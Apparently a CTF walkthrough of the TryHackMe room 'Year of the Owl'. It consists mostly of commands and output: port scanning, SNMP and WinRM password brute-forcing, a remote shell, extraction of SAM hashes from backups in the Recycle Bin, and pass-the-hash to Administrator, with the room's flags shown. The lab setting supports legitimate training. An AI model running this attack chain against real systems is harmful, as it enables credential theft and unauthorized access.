
```python
sudo nmap -sS -sV -p- -v -T4 10.10.8.222
```

```output
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```python
sudo nmap 10.10.8.222 -sUV --top-ports 10
```

```output
PORT     STATE         SERVICE      VERSION
53/udp   open|filtered domain
67/udp   open|filtered dhcps
123/udp  open|filtered ntp
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open|filtered snmp
445/udp  open|filtered microsoft-ds
631/udp  open|filtered ipp
1434/udp open|filtered ms-sql-m
```

`Checked port 80 in Firefox`
![[Pasted image 20250126195956.png]]

```python
sudo gobuster dir -u http://10.10.58.22 -w /usr/share/wordlists/dirb/common.txt
```

```python
curl http://10.10.8.222
```

```output
<!DOCTYPE html>
</html>
	<head>
		<title>Year of the Owl</title>
		<meta charset=utf-8>
		<meta name="viewport" content="width=device-width user-scalable=no">
		<link rel="stylesheet" type="text/css" href="style.css">
	</head>
	<body>
	</body>
</html>
```


```python
gobuster dir -u http://10.10.8.222/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```



```python
onesixtyone 10.10.8.222 -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 
```

```output
10.10.8.222 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```


```python
sudo snmp-check -c openview 10.10.133.138  
```


```python
sudo crackmapexec winrm 10.10.8.222 -u Jareth -p /usr/share/wordlists/rockyou.txt
```

```output
WINRM       10.10.8.222     5985   YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:sarah (Pwn3d!)
```



```python
evil-winrm -u jareth -p sarah -i 10.10.8.222 
```

```output
evil-winrm -u jareth -p sarah -i 10.10.8.222                          
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Jareth\Documents> ls
*Evil-WinRM* PS C:\Users\Jareth\Documents> dir
*Evil-WinRM* PS C:\Users\Jareth\Documents> dir
```

```python
whoami /all
```

```python
cd ..
cd Desktop
```

```python
type user.txt
```

```output
THM{Y2I0NDJjODY2NTc2YmI2Y2U4M2IwZTBl}
```

Check Recycling bin need user `SID`
```python
whoami /all
```

```output
USER INFORMATION
----------------

User Name              SID
====================== =============================================
year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001
```
- add SID to the end of the recycling bin directoy path
```python
cd 'c:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
```

```python
move .\system.bak c:\users\jareth\documents\system.bak
move .\sam.bak c:\users\jareth\documents\sam.bak
```

```python
download sam.bak
download system.bak
```

```python
impacket-secretsdump -sam /home/kali/sam.bak -system /home/kali/system.bak LOCAL 
```

```output
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
```

```python
evil-winrm -u administrator -p aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a -i 10.10.8.222
```

```output
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type admin.txt
THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}
```
